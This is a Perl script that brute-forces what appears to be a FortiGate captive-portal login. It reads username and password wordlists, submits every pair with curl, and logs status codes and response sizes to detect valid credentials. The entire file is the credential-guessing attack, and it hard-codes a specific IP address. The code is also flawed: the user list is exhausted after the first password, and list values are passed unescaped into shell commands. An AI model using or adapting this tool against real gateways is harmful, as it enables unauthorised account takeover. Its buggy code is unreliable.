#!/usr/bin/perl

use Getopt::Std;

sub makeRequest {
    my ($url, $data, $success) = @_;
}
    
my %opts = {};
getopts('L:P:u:d:', \%opts);
my $rurl=`curl -kLs -o /dev/null -w %{url_effective} "$opts{u}"`;
if ($rurl =~ m'fgtauth\?(.*)') {
    $magic = $1;
} else {
    die "can't find magic";
}

open(my $ufile, '<', $opts{L})
    or die "Couldn't open file $opts{L}";
open(my $pfile, '<', $opts{P})
    or die "Couldn't open file $opts{P}";
my $format="%-65s%-20s%-20s%-10s%s\n";
printf $format, "URL", "User", "Password", "Status", "Length";
while (my $pass = <$pfile>) {
    chomp $pass;
    while (my $user = <$ufile>) {
        chomp $user;
        my $params = "4Tredir=https%3A%2F%2F24.196.61.146%2F&magic=$magic&username=$user&password=$pass";
        my $response = `curl --data "$params" -kso "$user.$pass.html" -w "%{http_code}, %{size_download}" "$rurl"`;
        @response = split(/,\s*/, $response);
        printf $format, $rurl, $user, $pass, $response[0], $response[1];
    }
}
